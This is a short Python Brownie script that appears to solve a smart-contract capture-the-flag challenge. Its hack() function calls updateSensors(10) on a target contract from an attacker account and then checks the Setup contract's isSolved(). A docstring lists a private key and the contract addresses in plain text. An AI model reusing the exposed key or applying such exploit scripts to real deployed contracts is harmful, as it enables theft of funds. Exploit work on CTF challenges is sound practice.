#!/usr/bin/python3
from brownie import Unknown, Setup, web3
from scripts.helpful_scripts import get_account
from scripts.deploy import deploy
from colorama import Fore

"""
Private key     :  0x8c09cee15b6dc818d28e50a24c6778f0a4fd25d801087d4a78372cbdd97d147a
Address         :  0x905975EEF4679c0cc48717522216994Fc01cC67D
Target contract :  0x891deB1C64ca991eC507aCb376ebDdD065D183a0
Setup contract  :  0x8cBd838e43E47AAE195e1864FcEfB024f604965a
"""

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

def hack(contract_address=None, attacker=None):
    if not contract_address:
        un, st, owner = deploy()
        # contract_address = un.address
        #print(contract_address, owner)
        _, attacker = get_account()
    else:
        un = Unknown.at("0x891deB1C64ca991eC507aCb376ebDdD065D183a0")
        st = Setup.at("0x8cBd838e43E47AAE195e1864FcEfB024f604965a")

    #print(un.address)
    tx = un.updateSensors(10, {"from": attacker})
    tx.wait(1)
    
    print(f"{green}Update Sensors: {red}{un.updated()}")
    print(f"{green}Solved: {red}{st.isSolved()}{reset}")
    



def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()

if __name__ == '__main__':
    main()